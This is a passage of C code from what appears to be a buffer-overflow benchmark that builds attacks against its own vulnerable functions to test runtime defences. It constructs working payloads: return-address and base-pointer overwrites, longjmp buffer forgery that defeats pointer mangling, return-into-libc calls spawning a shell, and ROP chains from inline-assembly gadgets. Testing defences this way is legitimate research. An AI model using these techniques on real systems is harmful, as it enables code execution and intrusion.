    memcpy(temp_char_buffer + payload->size - 4*sizeof(uintptr_t) - sizeof(char),
        &rop_sled[1],
        sizeof(uintptr_t));
    memcpy(temp_char_buffer + payload->size - 5*sizeof(uintptr_t) - sizeof(char),
        &rop_sled[0],
        sizeof(uintptr_t));

    // Free the old payload buffer
    free(payload->buffer);
    // Set the new payload buffer
    payload->buffer = temp_char_buffer;
    /* *************************************** */
    /* Special case: Build old base poitner    */
    /* *************************************** */
  } else if (attack.code_ptr == OLD_BASE_PTR) {
    // Set an offset for where in the payload padding
    // area to inject a fake stack frame with a
    // copied base pointer and a return address
    // pointing to attack code
    payload->offset_to_fake_return_addr = (8 * sizeof(uintptr_t));

    if (attack.technique == DIRECT)
      payload->fake_return_addr = payload->overflow_ptr;

    // Insert fake return address after the fake old base pointer
    // for indirect attacks is either buffer, gadget4+X or gadget1+X
    memcpy(&(payload->buffer[payload->size -
          sizeof(char) -
          sizeof(uintptr_t) -
          payload->offset_to_fake_return_addr]),
        &(payload->fake_return_addr),
        sizeof(uintptr_t));

    if (attack.inject_param == RETURN_INTO_LIBC){
      /* Insert pointer to environment variable containing a */
      /* "/bin/sh" parameter for return-into-libc attacks    */
      temp_char_ptr = getenv("param_to_system");
      memcpy(&(payload->buffer[payload->size -
            sizeof(char) -
            sizeof(uintptr_t) -
            payload->offset_to_fake_return_addr +
            sizeof(uintptr_t)]),
          &temp_char_ptr,
          sizeof(uintptr_t));

      void * system_ptr = &system;
      memcpy(&(payload->buffer[payload->size -
            sizeof(char) -
            sizeof(uintptr_t) -
            payload->offset_to_fake_return_addr +
            2*sizeof(uintptr_t)]),
          &system_ptr,
          sizeof(uintptr_t));

    } else if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
      char search_chars1[] = {0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, '\0'};
      temp_char_ptr = getenv("param_to_system");
      char search_chars2[] = {0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0xc3, '\0'};
      char search_chars3[] = {0x0f, 0x05, '\0'};
      uintptr_t rop_sled[] = {
        (uintptr_t)&gadget1 + find_gadget_offset(search_chars1),
        (uintptr_t)temp_char_ptr,
        (uintptr_t)&gadget2 + find_gadget_offset(search_chars2),
        (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
        (uintptr_t)&exit};

      memcpy(&(payload->buffer[payload->size -
            sizeof(char) -
            sizeof(uintptr_t) -
            payload->offset_to_fake_return_addr]),
          &rop_sled[0],
          sizeof(uintptr_t));

      memcpy(&(payload->buffer[payload->size -
            sizeof(char) -
            sizeof(uintptr_t) -
            payload->offset_to_fake_return_addr +
            sizeof(uintptr_t)]),
          &rop_sled[1],
          sizeof(uintptr_t));

      memcpy(&(payload->buffer[payload->size -
            sizeof(char) -
            sizeof(uintptr_t) -
            payload->offset_to_fake_return_addr +
            2*sizeof(uintptr_t)]),
          &rop_sled[2],
          sizeof(uintptr_t));

      memcpy(&(payload->buffer[payload->size -
            sizeof(char) -
            sizeof(uintptr_t) -
            payload->offset_to_fake_return_addr +
            3*sizeof(uintptr_t)]),
          &rop_sled[3],
          sizeof(uintptr_t));

      memcpy(&(payload->buffer[payload->size -
            sizeof(char) -
            sizeof(uintptr_t) -
            payload->offset_to_fake_return_addr +
            4*sizeof(uintptr_t)]),
          &rop_sled[4],
          sizeof(uintptr_t));
    }

    if (attack.technique == DIRECT) {
      // Extend the payload to cover the return address
      // The return address is not going to be changed
      // since the attack targets the old base pointer
      // but it's more robust to write the return address
      // in its correct place instead of corrupting it
      // with the terminating null char in the payload

      // Extend payload size
      payload->size += sizeof(uintptr_t);
      // Allocate new payload buffer
      temp_char_buffer = (char *)malloc(payload->size);
      // Copy current payload to new payload buffer
      memcpy(temp_char_buffer, payload->buffer, payload->size);
      // Copy existing return address to new payload
      memcpy(temp_char_buffer + payload->size - sizeof(char) - sizeof(uintptr_t),
          &(payload->ptr_to_correct_return_addr),
          sizeof(uintptr_t));

      // Free the old payload buffer
      free(payload->buffer);
      // Set the new payload buffer
      payload->buffer = temp_char_buffer;

      // Configure so that old base pointer will be overwritten to
      // point to the copied base pointer in the injected fake stack frame.
      // First - point to the copied base pointer
      void * tmp_ptr = (void *)(payload->buffer_addr + payload->size - // end
          sizeof(char) -       // null terminator
          sizeof(uintptr_t) -  // copied correct ret
          sizeof(uintptr_t) -  // injected new base ptr
          payload->offset_to_fake_return_addr -
          sizeof(uintptr_t));  // the copied base ptr

      // Copy pointer to copied base pointer
      memcpy(&(payload->buffer[payload->size -// end
            sizeof(char) -         // null terminator
            sizeof(uintptr_t) -    // copied correct ret
            sizeof(uintptr_t)]),    // injected new base ptr
          &tmp_ptr,
          sizeof(uintptr_t));

    } else { // INDIRECT
      // Set the target addr (mem pointer) to point to the base pointer (OLD_BP_PTR)
      memcpy(&(payload->buffer[payload->size - sizeof(char) - sizeof(uintptr_t)]),
          &payload->overflow_ptr,
          sizeof(uintptr_t));
    }
    /* *************************************** */
    /* Special case: Build fake longjmp buffer */
    /* *************************************** */
  } else if (attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
      attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
      attack.code_ptr == LONGJMP_BUF_HEAP ||
      attack.code_ptr == LONGJMP_BUF_BSS ||
      attack.code_ptr == LONGJMP_BUF_DATA) {
    if (attack.technique == DIRECT) {
      /* If we're aiming for a direct longjmp buffer attack we need to copy */
      /* RBX, RBP*, R12, R13, R14, R15, RSP* and PC* from jmp_buffer to build a complete longjmp buffer */
      /* We construct PC just after*/
      memcpy(&(payload->buffer[payload->size - sizeof(char) - (8*sizeof(uintptr_t))]),
          payload->jmp_buffer,
          7*sizeof(uintptr_t));

      /* If the payload happens to contain a null that null will */
      /* terminate all string functions so we try removing them  */
      if (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)) {
        remove_nulls(payload->buffer, payload->size);
      }

      // need to mangle pointers
      uintptr_t mangled_base_pointer = *(((uintptr_t *)payload->jmp_buffer)+1);
      if (output_debug_info){
        fprintf(stderr, "old_base_ptr:%p, rol OBP:0x%lx, mangled_old_base_ptr:0x%lx\n",
            payload->old_base_ptr, rol((uintptr_t)payload->old_base_ptr), mangled_base_pointer);
        fprintf(stderr, "overflow_ptr:%p, rolled: 0x%lx, ",
            payload->overflow_ptr, rol((uintptr_t)payload->overflow_ptr));
      }

      // mangle the overflow_ptr
      payload->overflow_ptr = (void*)(rol((uintptr_t)payload->overflow_ptr) ^
          rol((uintptr_t)payload->old_base_ptr) ^ mangled_base_pointer); // key
      if (output_debug_info) fprintf(stderr, "mangled_overflow_ptr:%p\n",payload->overflow_ptr);

      memcpy(&(payload->buffer[payload->size - sizeof(uintptr_t) - sizeof(char)]),
          &(payload->overflow_ptr), sizeof(uintptr_t));

      // Set r2libc gadgets at the beginning of the buffer and make the SP points to it
      if (attack.inject_param == RETURN_INTO_LIBC){
        /* Insert pointer to environment variable containing a */
        /* "/bin/sh" parameter for return-into-libc attacks    */
        temp_char_ptr = "/bin/bash";
        memcpy(&(payload->stack_buffer[0]),
            &temp_char_ptr,
            sizeof(uintptr_t));

        void * tmp_ptr = &system;
        memcpy(&(payload->stack_buffer[sizeof(uintptr_t)]),
            &tmp_ptr,
            sizeof(uintptr_t));

        tmp_ptr = &exit;
        memcpy(&(payload->stack_buffer[2*sizeof(uintptr_t)]),
            &tmp_ptr,
            sizeof(uintptr_t));
        // mangle the address of the buffer where there are r2libc gadgets
        uintptr_t tmp_ptr2 = (uintptr_t)(rol((uintptr_t)payload->stack_buffer) ^
            rol((uintptr_t)payload->old_base_ptr) ^ mangled_base_pointer); // key

        memcpy(&(payload->buffer[payload->size - // end
              sizeof(char) -        // null terminator
              sizeof(uintptr_t) -   // mangled PC
              sizeof(uintptr_t)]),  // mangled SP
            &tmp_ptr2,
            sizeof(uintptr_t));
      } else if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
        temp_char_ptr = "/bin/bash";
        char search_chars2[] = {0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00, 0xc3, '\0'};
        char search_chars3[] = {0x0f, 0x05, '\0'};
        uintptr_t rop_sled[] = {
          (uintptr_t)temp_char_ptr,
          (uintptr_t)&gadget2 + find_gadget_offset(search_chars2),
          (uintptr_t)&gadget3 + find_gadget_offset(search_chars3),
          (uintptr_t)&exit};

        memcpy(&(payload->stack_buffer[0]),
            &rop_sled[0],
            sizeof(uintptr_t));
        memcpy(&(payload->stack_buffer[sizeof(uintptr_t)]),
            &rop_sled[1],
            sizeof(uintptr_t));
        memcpy(&(payload->stack_buffer[2*sizeof(uintptr_t)]),
            &rop_sled[2],
            sizeof(uintptr_t));
        memcpy(&(payload->stack_buffer[3*sizeof(uintptr_t)]),
            &rop_sled[3],
            sizeof(uintptr_t));

        // mangle the address of the buffer where there are r2libc gadgets
        uintptr_t tmp_ptr2 = (uintptr_t)(rol((uintptr_t)payload->stack_buffer) ^
            rol((uintptr_t)payload->old_base_ptr) ^ mangled_base_pointer); // key

        memcpy(&(payload->buffer[payload->size - // end
              sizeof(char) -        // null terminator
              sizeof(uintptr_t) -   // mangled PC
              sizeof(uintptr_t)]),  // mangled SP
            &tmp_ptr2,
            sizeof(uintptr_t));
      }
    } else {// Indirect attack on jump buffer
      if (payload->buffer_addr < (uintptr_t)payload->overflow_ptr &&
          (uintptr_t)payload->overflow_ptr < (payload->buffer_addr+payload->size)){
        // If we're aiming for a indirect longjmp buffer attack and if the jump buffer is on the way
        // we need to copy  RBX, RBP*, R12, R13, R14, R15, RSP* and PC* from jmp_buffer to build a valid longjmp buffer */
        // PC will be changed by the indirect de-referencement
        // payload.overflow_ptr points to the PC stored in the jmp buffer so the jmp buffer is
        // at (uintptr_t)payload->overflow_ptr - 7*sizeof(uintptr_t)
        size_t offset_to_jmp_buffer = ((uintptr_t)payload->overflow_ptr - 7*sizeof(uintptr_t)) - payload->buffer_addr;
        memcpy(&(payload->buffer[offset_to_jmp_buffer]),
            payload->jmp_buffer,
            8*sizeof(uintptr_t));

        /* If the payload happens to contain a null that null will */
        /* terminate all string functions so we try removing them  */
        if (!(attack.function == MEMCPY) && !(attack.function == HOMEBREW)) {
          remove_nulls(payload->buffer, payload->size);
        }
      }
      // Set the generic pointer to point to the stored PC in the jmp_buf
      memcpy(&(payload->buffer[payload->size - sizeof(char) - sizeof(uintptr_t)]),
          &(payload->overflow_ptr), sizeof(uintptr_t));
    }
  } else { // not a special case
    /* Set the address to the shellcode as ret add*/
    memcpy(&(payload->buffer[payload->size - sizeof(char) - sizeof(uintptr_t)]),
        &(payload->overflow_ptr), sizeof(uintptr_t));
  }

  /* Finally, add the terminating null character at the end */
  memset((payload->buffer + payload->size - sizeof(char)), '\0', sizeof(char));

  return TRUE;
}

boolean is_terminating_char(char value) {
  // we don't care about terminating chars with memcpy and the homebrew version of it
  if (attack.function == MEMCPY || attack.function == HOMEBREW)
    return FALSE;

  if (value == '\0'    // NUL, 0x00
      // value == '\n' ||    // New line (or Line feed), 0x0a
      // value == '\r' ||    // Carriage return, 0x0d
      // value == (char)0xff   // -1
     ) {
    return TRUE;
  } else {
    return FALSE;
  }
}

boolean contains_terminating_char(uintptr_t value) {
  size_t i = 0;
  char current_char, previous_char;

  // it checks if there is a zero char in the address
  // the zeros at the beginning are ignored
  while (i < sizeof(uintptr_t)) {
    current_char = (char)(value & (unsigned char)-1);
    if (i != 0 && current_char != 0 && is_terminating_char(previous_char)) {
      return TRUE;
    }

    previous_char = current_char;
    // CHAR_BIT declared in limits.h
    value >>= CHAR_BIT;
    i++;
  }
  return FALSE;
}

void remove_nulls(char *contents, size_t length) {
  size_t i;

  for(i = 0; i < length; i++) {
    if (contents[i] == '\0')      /* NUL */
      contents[i]++;
  }
}

void locate_terminating_chars(char *contents, size_t length) {
  char found_one = 0;
  char print_in_the_middle = 1;
  size_t i;

  for (i = 0; i < length; i++) {
    if (is_terminating_char(contents[i])) {
      if (found_one) {
        fprintf(stderr, ", %x at %zu", contents[i] & 0xff,i);
        print_in_the_middle = 1;
      } else {
        found_one = 1;
        fprintf(stderr, "The payload has a terminating char (%x) at pos %zu", contents[i] & 0xff, i);
      }
    } else {
      if (found_one && print_in_the_middle) {
        print_in_the_middle = 0;
        fprintf(stderr, " (in the middle)");
      }
    }
  }
  if (found_one) {
    fprintf(stderr, "\n");
  }
}

void set_technique(char *choice) {
  if (strcmp(choice, opt_techniques[0]) == 0) {
    attack.technique = DIRECT;
  } else if (strcmp(choice, opt_techniques[1]) == 0) {
    attack.technique = INDIRECT;
  } else {
    fprintf(stderr, "Error: Unknown choice of technique \"%s\"\n",
        choice);
  }
}

void set_inject_param(char *choice) {
  if (strcmp(choice, opt_inject_params[0]) == 0) {
    attack.inject_param = INJECTED_CODE_NO_NOP;
  } else if (strcmp(choice, opt_inject_params[1]) == 0) {
    attack.inject_param = INJECTED_CODE_SIMPLE_NOP;
  } else if (strcmp(choice, opt_inject_params[2]) == 0) {
    attack.inject_param = INJECTED_CODE_SIMPLE_NOP_EQUIVALENT;
  } else if (strcmp(choice, opt_inject_params[3]) == 0) {
    attack.inject_param = RETURN_INTO_LIBC;
  } else if (strcmp(choice, opt_inject_params[4]) == 0) {
    attack.inject_param = RETURN_ORIENTED_PROGRAMMING;
  } else {
    if (output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of injection parameter \"%s\"\n",
          choice);
    }
    exit(1);
  }
}

void set_code_ptr(char *choice) {
  if (strcmp(choice, opt_code_ptrs[0]) == 0) {
    attack.code_ptr = RET_ADDR;
  } else if (strcmp(choice, opt_code_ptrs[1]) == 0) {
    attack.code_ptr = OLD_BASE_PTR;
  } else if (strcmp(choice, opt_code_ptrs[2]) == 0) {
    attack.code_ptr = FUNC_PTR_STACK_VAR;
  } else if (strcmp(choice, opt_code_ptrs[3]) == 0) {
    attack.code_ptr = FUNC_PTR_STACK_PARAM;
  } else if (strcmp(choice, opt_code_ptrs[4]) == 0) {
    attack.code_ptr = FUNC_PTR_HEAP;
  } else if (strcmp(choice, opt_code_ptrs[5]) == 0) {
    attack.code_ptr = FUNC_PTR_BSS;
  } else if (strcmp(choice, opt_code_ptrs[6]) == 0) {
    attack.code_ptr = FUNC_PTR_DATA;
  } else if (strcmp(choice, opt_code_ptrs[7]) == 0) {
    attack.code_ptr = LONGJMP_BUF_STACK_VAR;
  } else if (strcmp(choice, opt_code_ptrs[8]) == 0) {
    attack.code_ptr = LONGJMP_BUF_STACK_PARAM;
  } else if (strcmp(choice, opt_code_ptrs[9]) == 0) {
    attack.code_ptr = LONGJMP_BUF_HEAP;
  } else if (strcmp(choice, opt_code_ptrs[10]) == 0) {
    attack.code_ptr = LONGJMP_BUF_BSS;
  } else if (strcmp(choice, opt_code_ptrs[11]) == 0) {
    attack.code_ptr = LONGJMP_BUF_DATA;
  } else if (strcmp(choice,opt_code_ptrs[12]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_STACK;
  } else if (strcmp(choice,opt_code_ptrs[13]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_HEAP;
  } else if (strcmp(choice,opt_code_ptrs[14]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_DATA;
  } else if (strcmp(choice,opt_code_ptrs[15]) == 0){
    attack.code_ptr = STRUCT_FUNC_PTR_BSS;
  } else {
    if (output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of code pointer \"%s\"\n", choice);
    }
    exit(1);
  }
}

void set_location(char *choice) {
  if (strcmp(choice, opt_locations[0]) == 0) {
    attack.location = STACK;
  } else if (strcmp(choice, opt_locations[1]) == 0) {
    attack.location = HEAP;
  } else if (strcmp(choice, opt_locations[2]) == 0) {
    attack.location = BSS;
  } else if (strcmp(choice, opt_locations[3]) == 0) {
    attack.location = DATA;
  } else {
    if (output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of memory location \"%s\"\n",
          choice);
    }
    exit(1);
  }
}

void set_function(char *choice) {
  if (strcmp(choice, opt_funcs[0]) == 0) {
    attack.function = MEMCPY;
  } else if (strcmp(choice, opt_funcs[1]) == 0) {
    attack.function = STRCPY;
  } else if (strcmp(choice, opt_funcs[2]) == 0) {
    attack.function = STRNCPY;
  } else if (strcmp(choice, opt_funcs[3]) == 0) {
    attack.function = SPRINTF;
  } else if (strcmp(choice, opt_funcs[4]) == 0) {
    attack.function = SNPRINTF;
  } else if (strcmp(choice, opt_funcs[5]) == 0) {
    attack.function = STRCAT;
  } else if (strcmp(choice, opt_funcs[6]) == 0) {
    attack.function = STRNCAT;
  } else if (strcmp(choice, opt_funcs[7]) == 0) {
    attack.function = SSCANF;
  } else if (strcmp(choice, opt_funcs[8]) == 0) {
    attack.function = FSCANF;
  } else if (strcmp(choice, opt_funcs[9]) == 0) {
    attack.function = HOMEBREW;
  } else {
    if (output_error_msg) {
      fprintf(stderr, "Error: Unknown choice of vulnerable function \"%s\"\n",
          choice);
    }
    exit(1);
  }
}

/*************************************/
/* Check for impossible attack forms */
/*************************************/
boolean is_attack_possible() {
  // direct attack from a different memory region
  switch(attack.location) {
    case STACK:
      if ((attack.technique == DIRECT) &&
          ((attack.code_ptr == FUNC_PTR_HEAP) ||
           (attack.code_ptr == FUNC_PTR_BSS) ||
           (attack.code_ptr == FUNC_PTR_DATA) ||
           (attack.code_ptr == LONGJMP_BUF_HEAP) ||
           (attack.code_ptr == LONGJMP_BUF_BSS) ||
           (attack.code_ptr == LONGJMP_BUF_DATA) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
        if (output_error_msg) {
          fprintf(stderr, "Error: Impossible to perform a direct attack on the stack into another memory segment.\n");
        }
        return FALSE;
      }
      break;
    case HEAP:
      if ((attack.technique == DIRECT) &&
          ((attack.code_ptr == RET_ADDR) ||
           (attack.code_ptr == OLD_BASE_PTR) ||
           (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
           (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
           (attack.code_ptr == FUNC_PTR_BSS) ||
           (attack.code_ptr == FUNC_PTR_DATA) ||
           (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
           (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
           (attack.code_ptr == LONGJMP_BUF_BSS) ||
           (attack.code_ptr == LONGJMP_BUF_DATA) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_BSS)  )) {
        if (output_error_msg) {
          fprintf(stderr, "Error: Impossible perform a direct attack on the heap into another memory segment.\n");
        }
        return FALSE;
      }
      break;
    case BSS:
      if ((attack.technique == DIRECT) &&
          ((attack.code_ptr == RET_ADDR) ||
           (attack.code_ptr == OLD_BASE_PTR) ||
           (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
           (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
           (attack.code_ptr == FUNC_PTR_HEAP) ||
           (attack.code_ptr == FUNC_PTR_DATA) ||
           (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
           (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
           (attack.code_ptr == LONGJMP_BUF_HEAP) ||
           (attack.code_ptr == LONGJMP_BUF_DATA) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_HEAP)  )) {
        if (output_error_msg) {
          fprintf(stderr, "Error: Impossible to peform a direct attack in the BSS segment into another memory segment.\n");
        }
        return FALSE;
      }
      break;
    case DATA:
      if ((attack.technique == DIRECT) &&
          ((attack.code_ptr == RET_ADDR) ||
           (attack.code_ptr == OLD_BASE_PTR) ||
           (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
           (attack.code_ptr == FUNC_PTR_STACK_PARAM) ||
           (attack.code_ptr == FUNC_PTR_HEAP) ||
           (attack.code_ptr == FUNC_PTR_BSS) ||
           (attack.code_ptr == LONGJMP_BUF_STACK_VAR) ||
           (attack.code_ptr == LONGJMP_BUF_STACK_PARAM) ||
           (attack.code_ptr == LONGJMP_BUF_HEAP) ||
           (attack.code_ptr == LONGJMP_BUF_BSS) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_STACK) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
           (attack.code_ptr == STRUCT_FUNC_PTR_BSS) )) {
        if (output_error_msg) {
          fprintf(stderr, "Error: Impossible to perform a direct attack in the Data segment into another memory segment.\n");
        }
        return FALSE;
      }
      break;
    default:
      if (output_error_msg) {
        fprintf(stderr, "Error: Unknown choice of buffer location\n");
      }
      return FALSE;
  }

  // Indirect attacks doing return-into-libc are considered
  // impossible since the attacker cannot inject a parameter,
  // e.g. the parameter "/bin/sh" to system().
  // The exception to the rule is an attack against the old
  // base pointer we're the attacker injects a whole fake
  // stack frame.
  // Indirect attacks are possible on functions that already
  // have the right parameters.
  if (attack.inject_param == RETURN_INTO_LIBC &&
      attack.technique == INDIRECT &&
      (attack.code_ptr == RET_ADDR ||
       attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
       attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
       attack.code_ptr == LONGJMP_BUF_HEAP ||
       attack.code_ptr == LONGJMP_BUF_DATA ||
       attack.code_ptr == LONGJMP_BUF_BSS)
     ) {
    if (output_error_msg) {
      fprintf(stderr, "Error: Impossible to perform an indirect return-into-libc attack since parameters for the libc function cannot be injected (need to do some ROP).\n");
    }
    return FALSE;
  }

  if (attack.function != MEMCPY && attack.function != HOMEBREW) {
    if (attack.code_ptr == OLD_BASE_PTR) {
      fprintf(stderr, "Error: Impossible to perform an attack on the old base ptr "
          "by abusing string function because the addresses in the fake stack frame "
          "have zero that will terminate the payload.(for now, maybe possible with other technique)\n");
      return FALSE;
    }

    if (attack.technique == DIRECT &&
        attack.code_ptr == RET_ADDR &&
        (attack.inject_param == RETURN_ORIENTED_PROGRAMMING || attack.inject_param == RETURN_INTO_LIBC)) {
      fprintf(stderr, "Error: Impossible to perform ROP and return2libc direct attack on the return address "
          "by abusing string function because the gadget addresses have zero that will terminate the payload."
          "(for now, it is maybe possible with other technique)\n");
      return FALSE;
    }
  }

  if (attack.inject_param == RETURN_ORIENTED_PROGRAMMING) {
    if (attack.technique == DIRECT) {
      switch(attack.code_ptr) {
        case RET_ADDR:
        case OLD_BASE_PTR:
        case LONGJMP_BUF_STACK_VAR:
        case LONGJMP_BUF_STACK_PARAM:
        case LONGJMP_BUF_HEAP:
        case LONGJMP_BUF_DATA:
        case LONGJMP_BUF_BSS:
          // attack possible
          break;
        default:
          fprintf(stderr,"Error: Impossible...\n");
          return FALSE;
          break;
      }
    } else if (attack.technique == INDIRECT && attack.code_ptr != OLD_BASE_PTR) {
      fprintf(stderr,"Error: Impossible...\n");
      return FALSE;
    }
  }


  return TRUE;
}


boolean are_variables_well_located(uintptr_t buffer, uintptr_t target_addr, uintptr_t overflow_ptr) {
  if (output_debug_info) {
    fprintf(stderr, "target_addr == 0x%lx\n", target_addr);
    fprintf(stderr, "payload.overflow_ptr == 0x%lx\n", overflow_ptr);
    fprintf(stderr, "buffer == 0x%lx\n", buffer);
    fprintf(stderr, "diff target_addr - buffer == %zu\n", target_addr - buffer);
  }
  if (target_addr > buffer) {
    if (attack.technique == INDIRECT && (
          attack.code_ptr == LONGJMP_BUF_STACK_VAR ||
          attack.code_ptr == LONGJMP_BUF_STACK_PARAM ||
          attack.code_ptr == LONGJMP_BUF_HEAP ||
          attack.code_ptr == LONGJMP_BUF_BSS ||
          attack.code_ptr == LONGJMP_BUF_DATA)){
      // check if the jmp_buffer is between the buffer and
      // the generic pointer. Else it will be overwritten
      if (buffer < overflow_ptr &&
          overflow_ptr < target_addr) {
        fprintf(stderr, "Info: The jump buffer is between the buffer and the target generic pointer\n"
            "the original jump buffer is inserted in the payload to keep a valid jmp buf\n");
      }
    }
    return TRUE;
  } else {
    if (output_error_msg) {
      fprintf(stderr, "Error: Target address is lower than address of overflow buffer.\n");
      fprintf(stderr, "Overflow direction is towards higher addresses.\n");
    }
    return FALSE;
  }
}


void homebrew_memcpy(void *dst, const void *src, size_t length) {
  char *d, *s;
  d = (char *)dst;
  s = (char *)src;
  while(length--) {
    *d++ = *s++;
  }
}

int find_gadget_offset(char* search_chars){
  FILE * pFile;
  long file_len;
  char *buffer, function_signature[] = {0x55, 0x48, 0x89, 0xE5};
  size_t search_chars_count = strlen(search_chars);
  size_t function_signature_count = sizeof(function_signature)/sizeof(function_signature[0]);
  int i = 0, found = 0, current_found_i = 0, offset = 0;

  // load the exutable in memory to a buffer
  pFile = fopen ( executable_path , "rb" );
  if (pFile==NULL){
    fprintf(stderr, "Error: file error in find_gadget");
    exit (1);
  }

  // Jump to the end of the file
  fseek(pFile, 0, SEEK_END);
  // Get the current byte offset in the file
  file_len = ftell(pFile);
  // Jump back to the beginning of the file
  rewind(pFile);

  buffer = (char *)malloc((file_len+1)*sizeof(char));
  if (buffer==NULL){
    fprintf(stderr, "Error: Cannot allocate memory in find_gadget");
    exit(1);
  }
  size_t bytes_read = fread(buffer, file_len, 1, pFile);
  if (bytes_read==0 && ferror(pFile)){
    fprintf(stderr, "Error: Cannot read file in find_gadget");
    exit(1);
  }
  fclose(pFile);

  // Look backward for the bytes pattern search_chars and then the beginning of the function 0x554889e5
  while((i < file_len) && (found == 0)) {
    if (buffer[file_len-i] == search_chars[search_chars_count-1-current_found_i]) {
      current_found_i++;
      if (current_found_i > search_chars_count-1) { //pattern found, look for start of local function
        current_found_i = 0;
        // the gadgets are at an offset from 50 to 150 from the function beginning
        offset = 50;
        //if (output_debug_info)
        //  fprintf(stderr,"Pattern found at byte %ld\n",file_len-i);
        while((offset < 150) && (found==0)){
          if (buffer[file_len-i-offset] == function_signature[function_signature_count-1-current_found_i]){
            current_found_i++;
            if (current_found_i > function_signature_count-1){
              if (output_debug_info)
                fprintf(stderr,"Begin of function byte at %ld, offset:%d\n",file_len-i-offset,offset);
              found =1;
              break;
            }
          }
          offset++;
        }
      }
    } else {
      current_found_i = 0;
    }
    i++;
  }

  if (found==0){
    fprintf(stderr, "pattern not found\n");
    return 0;
  } else {
    if (output_debug_info)
      fprintf(stderr,"Found at gadgetX+%d\n", offset);
    return offset;
  }
}

// Dummy functions used to create gadgets for the ROP attack
void gadget1(int a, int b){
  int arthur,dent,j;
  arthur = a + b / 42;

  char buffer[256];
  for(j=0;j<10;j++);
  __asm__(
      "mov $0x3b, %rax\n"
      "pop %rdi;\n"
      "ret"
      );

  return;
}

void gadget2(int a, int b){
  int ford,prefect,j;
  ford = a + b / 43;
  for(j=0;j<10;j++);
  __asm__(
      "mov $0, %rsi\n"
      "mov $0, %rdx\n"
      "ret");

  return;
}

int gadget3(int a, int b){
  int i,j;
  i = a + b / 33;

  for(j=0;j<10;j++);
  __asm__("syscall");
  return 42;
}

void gadget4(int a, int b){
  int i,j;
  i = a + 4*b / 12;

  for(j=0;j<5;j++);
  __asm__("nop; pop %rdi; ret;");
  return;
}
